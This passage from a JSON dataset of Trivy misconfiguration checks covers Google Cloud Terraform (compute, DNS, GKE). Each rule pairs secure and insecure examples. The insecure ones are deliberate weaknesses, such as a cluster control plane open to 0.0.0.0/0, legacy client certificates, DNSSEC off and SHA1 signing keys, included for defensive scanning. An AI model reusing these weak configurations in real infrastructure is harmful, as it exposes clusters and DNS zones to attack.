        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#kms_key_self_link\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n          kms_key_self_link = \"something\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n      }\n",
        "file_name": "vm_disk_encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/vm_disk_encryption_customer_key.yaml",
        "local_path": "google/compute/vm_disk_encryption_customer_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#kms_key_self_link"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n    kms_key_self_link = \"something\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-DNS-ENABLE_DNSSEC",
        "title": "Enable Dnssec",
        "provider": "google",
        "service": "dns",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#state\n  good:\n    - |-\n      resource \"google_dns_managed_zone\" \"good_example\" {\n        name     = \"example-zone\"\n        dns_name = \"example.com.\"\n        dnssec_config {\n          state = \"on\"\n        }\n      }\n    - |-\n      resource \"google_dns_managed_zone\" \"good_example\" {\n        name       = \"example-zone\"\n        dns_name   = \"example.com.\"\n        visibility = \"private\"\n        dnssec_config {\n          state = \"off\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_dns_managed_zone\" \"bad_example\" {\n        name        = \"example-zone\"\n        dns_name    = \"example.com.\"\n        description = \"Example DNS zone\"\n        dnssec_config {\n          state = \"off\"\n        }\n      }\n",
        "file_name": "enable_dnssec.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/dns/enable_dnssec.yaml",
        "local_path": "google/dns/enable_dnssec.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#state"
            ],
            "good": [
              "resource \"google_dns_managed_zone\" \"good_example\" {\n  name     = \"example-zone\"\n  dns_name = \"example.com.\"\n  dnssec_config {\n    state = \"on\"\n  }\n}",
              "resource \"google_dns_managed_zone\" \"good_example\" {\n  name       = \"example-zone\"\n  dns_name   = \"example.com.\"\n  visibility = \"private\"\n  dnssec_config {\n    state = \"off\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_dns_managed_zone\" \"bad_example\" {\n  name        = \"example-zone\"\n  dns_name    = \"example.com.\"\n  description = \"Example DNS zone\"\n  dnssec_config {\n    state = \"off\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-DNS-NO_RSA_SHA1",
        "title": "No Rsa Sha1",
        "provider": "google",
        "service": "dns",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#algorithm\n  good:\n    - |-\n      resource \"google_dns_managed_zone\" \"example-zone\" {\n        name     = \"example-zone\"\n        dns_name = \"example.com.\"\n\n        dnssec_config {\n          state = \"on\"\n          default_key_specs {\n            algorithm = \"rsasha512\"\n            key_type  = \"keySigning\"\n          }\n          default_key_specs {\n            algorithm = \"rsasha512\"\n            key_type  = \"zoneSigning\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_dns_managed_zone\" \"example-zone\" {\n        name     = \"example-zone\"\n        dns_name = \"example.com.\"\n\n        dnssec_config {\n          state = \"on\"\n          default_key_specs {\n            algorithm = \"rsasha1\"\n            key_type  = \"keySigning\"\n          }\n          default_key_specs {\n            algorithm = \"rsasha1\"\n            key_type  = \"zoneSigning\"\n          }\n        }\n      }\n",
        "file_name": "no_rsa_sha1.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/dns/no_rsa_sha1.yaml",
        "local_path": "google/dns/no_rsa_sha1.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#algorithm"
            ],
            "good": [
              "resource \"google_dns_managed_zone\" \"example-zone\" {\n  name     = \"example-zone\"\n  dns_name = \"example.com.\"\n\n  dnssec_config {\n    state = \"on\"\n    default_key_specs {\n      algorithm = \"rsasha512\"\n      key_type  = \"keySigning\"\n    }\n    default_key_specs {\n      algorithm = \"rsasha512\"\n      key_type  = \"zoneSigning\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_dns_managed_zone\" \"example-zone\" {\n  name     = \"example-zone\"\n  dns_name = \"example.com.\"\n\n  dnssec_config {\n    state = \"on\"\n    default_key_specs {\n      algorithm = \"rsasha1\"\n      key_type  = \"keySigning\"\n    }\n    default_key_specs {\n      algorithm = \"rsasha1\"\n      key_type  = \"zoneSigning\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_AUTO_REPAIR",
        "title": "Enable Auto Repair",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_repair\n  good:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name                     = \"my-gke-cluster\"\n        location                 = \"us-central1\"\n        remove_default_node_pool = true\n      }\n\n      resource \"google_container_node_pool\" \"good_example\" {\n        name    = \"my-node-pool\"\n        cluster = google_container_cluster.primary.id\n        management {\n          auto_repair = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name                     = \"my-gke-cluster\"\n        location                 = \"us-central1\"\n        remove_default_node_pool = true\n      }\n\n      resource \"google_container_node_pool\" \"bad_example\" {\n        name    = \"my-node-pool\"\n        cluster = google_container_cluster.primary.id\n        management {\n          auto_repair = false\n        }\n      }\n",
        "file_name": "enable_auto_repair.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_auto_repair.yaml",
        "local_path": "google/gke/enable_auto_repair.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_repair"
            ],
            "good": [
              "resource \"google_container_cluster\" \"primary\" {\n  name                     = \"my-gke-cluster\"\n  location                 = \"us-central1\"\n  remove_default_node_pool = true\n}\n\nresource \"google_container_node_pool\" \"good_example\" {\n  name    = \"my-node-pool\"\n  cluster = google_container_cluster.primary.id\n  management {\n    auto_repair = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"primary\" {\n  name                     = \"my-gke-cluster\"\n  location                 = \"us-central1\"\n  remove_default_node_pool = true\n}\n\nresource \"google_container_node_pool\" \"bad_example\" {\n  name    = \"my-node-pool\"\n  cluster = google_container_cluster.primary.id\n  management {\n    auto_repair = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_AUTO_UPGRADE",
        "title": "Enable Auto Upgrade",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_upgrade\n  good:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name                     = \"my-gke-cluster\"\n        location                 = \"us-central1\"\n        remove_default_node_pool = true\n      }\n\n      resource \"google_container_node_pool\" \"good_example\" {\n        name    = \"my-node-pool\"\n        cluster = google_container_cluster.primary.id\n        management {\n          auto_upgrade = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name                     = \"my-gke-cluster\"\n        location                 = \"us-central1\"\n        remove_default_node_pool = true\n      }\n\n      resource \"google_container_node_pool\" \"bad_example\" {\n        name    = \"my-node-pool\"\n        cluster = google_container_cluster.primary.id\n        management {\n          auto_upgrade = false\n        }\n      }\n",
        "file_name": "enable_auto_upgrade.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_auto_upgrade.yaml",
        "local_path": "google/gke/enable_auto_upgrade.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_upgrade"
            ],
            "good": [
              "resource \"google_container_cluster\" \"primary\" {\n  name                     = \"my-gke-cluster\"\n  location                 = \"us-central1\"\n  remove_default_node_pool = true\n}\n\nresource \"google_container_node_pool\" \"good_example\" {\n  name    = \"my-node-pool\"\n  cluster = google_container_cluster.primary.id\n  management {\n    auto_upgrade = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"primary\" {\n  name                     = \"my-gke-cluster\"\n  location                 = \"us-central1\"\n  remove_default_node_pool = true\n}\n\nresource \"google_container_node_pool\" \"bad_example\" {\n  name    = \"my-node-pool\"\n  cluster = google_container_cluster.primary.id\n  management {\n    auto_upgrade = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_IP_ALIASING",
        "title": "Enable Ip Aliasing",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#ip_allocation_policy\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        ip_allocation_policy {}\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n",
        "file_name": "enable_ip_aliasing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_ip_aliasing.yaml",
        "local_path": "google/gke/enable_ip_aliasing.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#ip_allocation_policy"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  ip_allocation_policy {}\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_MASTER_NETWORKS",
        "title": "Enable Master Networks",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        master_authorized_networks_config {\n          cidr_blocks {\n            cidr_block   = \"10.10.128.0/24\"\n            display_name = \"internal\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n",
        "file_name": "enable_master_networks.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_master_networks.yaml",
        "local_path": "google/gke/enable_master_networks.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block   = \"10.10.128.0/24\"\n      display_name = \"internal\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_NETWORK_POLICY",
        "title": "Enable Network Policy",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enabled\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        network_policy {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name             = \"my-gke-cluster\"\n        location         = \"us-central1\"\n        enable_autopilot = true\n      }\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name              = \"my-gke-cluster\"\n        location          = \"us-central1\"\n        datapath_provider = \"ADVANCED_DATAPATH\"\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        network_policy {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_network_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_network_policy.yaml",
        "local_path": "google/gke/enable_network_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enabled"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  network_policy {\n    enabled = true\n  }\n}",
              "resource \"google_container_cluster\" \"good_example\" {\n  name             = \"my-gke-cluster\"\n  location         = \"us-central1\"\n  enable_autopilot = true\n}",
              "resource \"google_container_cluster\" \"good_example\" {\n  name              = \"my-gke-cluster\"\n  location          = \"us-central1\"\n  datapath_provider = \"ADVANCED_DATAPATH\"\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  network_policy {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_PRIVATE_CLUSTER",
        "title": "Enable Private Cluster",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_private_nodes\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        private_cluster_config {\n          enable_private_nodes = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        private_cluster_config {\n          enable_private_nodes = false\n        }\n      }\n",
        "file_name": "enable_private_cluster.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_private_cluster.yaml",
        "local_path": "google/gke/enable_private_cluster.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_private_nodes"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  private_cluster_config {\n    enable_private_nodes = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  private_cluster_config {\n    enable_private_nodes = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_STACKDRIVER_LOGGING",
        "title": "Enable Stackdriver Logging",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#logging_service\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name            = \"my-gke-cluster\"\n        location        = \"us-central1\"\n        logging_service = \"logging.googleapis.com/kubernetes\"\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name            = \"my-gke-cluster\"\n        location        = \"us-central1\"\n        logging_service = \"logging.googleapis.com\"\n      }\n",
        "file_name": "enable_stackdriver_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_stackdriver_logging.yaml",
        "local_path": "google/gke/enable_stackdriver_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#logging_service"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name            = \"my-gke-cluster\"\n  location        = \"us-central1\"\n  logging_service = \"logging.googleapis.com/kubernetes\"\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name            = \"my-gke-cluster\"\n  location        = \"us-central1\"\n  logging_service = \"logging.googleapis.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-ENABLE_STACKDRIVER_MONITORING",
        "title": "Enable Stackdriver Monitoring",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#monitoring_service\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name               = \"my-gke-cluster\"\n        location           = \"us-central1\"\n        monitoring_service = \"monitoring.googleapis.com/kubernetes\"\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name               = \"my-gke-cluster\"\n        location           = \"us-central1\"\n        monitoring_service = \"monitoring.googleapis.com\"\n      }\n",
        "file_name": "enable_stackdriver_monitoring.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/enable_stackdriver_monitoring.yaml",
        "local_path": "google/gke/enable_stackdriver_monitoring.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#monitoring_service"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name               = \"my-gke-cluster\"\n  location           = \"us-central1\"\n  monitoring_service = \"monitoring.googleapis.com/kubernetes\"\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name               = \"my-gke-cluster\"\n  location           = \"us-central1\"\n  monitoring_service = \"monitoring.googleapis.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-METADATA_ENDPOINTS_DISABLED",
        "title": "Metadata Endpoints Disabled",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#metadata\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        node_config {\n          metadata = {\n            disable-legacy-endpoints = true\n          }\n        }\n      }\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        enable_autopilot = true\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        node_config {\n          metadata = {\n            disable-legacy-endpoints = false\n          }\n        }\n      }\n",
        "file_name": "metadata_endpoints_disabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/metadata_endpoints_disabled.yaml",
        "local_path": "google/gke/metadata_endpoints_disabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#metadata"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  node_config {\n    metadata = {\n      disable-legacy-endpoints = true\n    }\n  }\n}",
              "resource \"google_container_cluster\" \"good_example\" {\n  enable_autopilot = true\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  node_config {\n    metadata = {\n      disable-legacy-endpoints = false\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-NO_LEGACY_AUTHENTICATION",
        "title": "No Legacy Authentication",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#master_auth\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        master_auth {\n          client_certificate_config {\n            issue_client_certificate = true\n          }\n        }\n      }\n",
        "file_name": "no_legacy_authentication.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/no_legacy_authentication.yaml",
        "local_path": "google/gke/no_legacy_authentication.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#master_auth"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = true\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-NO_PUBLIC_CONTROL_PLANE",
        "title": "No Public Control Plane",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        master_authorized_networks_config {\n          cidr_blocks {\n            cidr_block   = \"10.10.128.0/24\"\n            display_name = \"internal\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        master_authorized_networks_config {\n          cidr_blocks {\n            cidr_block   = \"0.0.0.0/0\"\n            display_name = \"external\"\n          }\n        }\n      }\n",
        "file_name": "no_public_control_plane.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/no_public_control_plane.yaml",
        "local_path": "google/gke/no_public_control_plane.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block   = \"10.10.128.0/24\"\n      display_name = \"internal\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block   = \"0.0.0.0/0\"\n      display_name = \"external\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-NODE_METADATA_SECURITY",
        "title": "Node Metadata Security",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#node_metadata\n  good:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n\n        remove_default_node_pool = true\n        initial_node_count       = 1\n      }\n\n      resource \"google_container_node_pool\" \"good_example\" {\n        cluster = google_container_cluster.primary.id\n        node_config {\n          workload_metadata_config {\n            mode = \"GKE_METADATA\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n\n        remove_default_node_pool = true\n        initial_node_count       = 1\n      }\n\n      resource \"google_container_node_pool\" \"bad_example\" {\n        cluster = google_container_cluster.primary.id\n        node_config {\n          workload_metadata_config {\n            mode = \"GCE_METADATA\"\n          }\n        }\n      }\n",
        "file_name": "node_metadata_security.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/node_metadata_security.yaml",
        "local_path": "google/gke/node_metadata_security.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#node_metadata"
            ],
            "good": [
              "resource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n\n  remove_default_node_pool = true\n  initial_node_count       = 1\n}\n\nresource \"google_container_node_pool\" \"good_example\" {\n  cluster = google_container_cluster.primary.id\n  node_config {\n    workload_metadata_config {\n      mode = \"GKE_METADATA\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n\n  remove_default_node_pool = true\n  initial_node_count       = 1\n}\n\nresource \"google_container_node_pool\" \"bad_example\" {\n  cluster = google_container_cluster.primary.id\n  node_config {\n    workload_metadata_config {\n      mode = \"GCE_METADATA\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-NODE_POOL_USES_COS",
        "title": "Node Pool Uses Cos",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#image_type\n  good:\n    - |-\n      resource \"google_container_cluster\" \"primary\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n\n      resource \"google_container_node_pool\" \"good_example\" {\n        name       = \"my-node-pool\"\n        cluster    = google_container_cluster.primary.id\n        node_count = 1\n\n        node_config {\n          preemptible  = true\n          machine_type = \"e2-medium\"\n          image_type   = \"COS\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_service_account\" \"default\" {\n        account_id   = \"service-account-id\"\n        display_name = \"Service Account\"\n      }\n\n      resource \"google_container_cluster\" \"primary\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n\n      resource \"google_container_node_pool\" \"bad_example\" {\n        name       = \"my-node-pool\"\n        cluster    = google_container_cluster.primary.id\n        node_count = 1\n\n        node_config {\n          preemptible  = true\n          machine_type = \"e2-medium\"\n          image_type   = \"UBUNTU_CONTAINERD\"\n        }\n      }\n",
        "file_name": "node_pool_uses_cos.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/node_pool_uses_cos.yaml",
        "local_path": "google/gke/node_pool_uses_cos.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#image_type"
            ],
            "good": [
              "resource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}\n\nresource \"google_container_node_pool\" \"good_example\" {\n  name       = \"my-node-pool\"\n  cluster    = google_container_cluster.primary.id\n  node_count = 1\n\n  node_config {\n    preemptible  = true\n    machine_type = \"e2-medium\"\n    image_type   = \"COS\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_service_account\" \"default\" {\n  account_id   = \"service-account-id\"\n  display_name = \"Service Account\"\n}\n\nresource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}\n\nresource \"google_container_node_pool\" \"bad_example\" {\n  name       = \"my-node-pool\"\n  cluster    = google_container_cluster.primary.id\n  node_count = 1\n\n  node_config {\n    preemptible  = true\n    machine_type = \"e2-medium\"\n    image_type   = \"UBUNTU_CONTAINERD\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-NODE_SHIELDING_ENABLED",
        "title": "Node Shielding Enabled",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_shielded_nodes\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        enable_shielded_nodes = \"true\"\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        enable_shielded_nodes = \"false\"\n      }\n",
        "file_name": "node_shielding_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/node_shielding_enabled.yaml",
        "local_path": "google/gke/node_shielding_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_shielded_nodes"
            ],
            "good": [
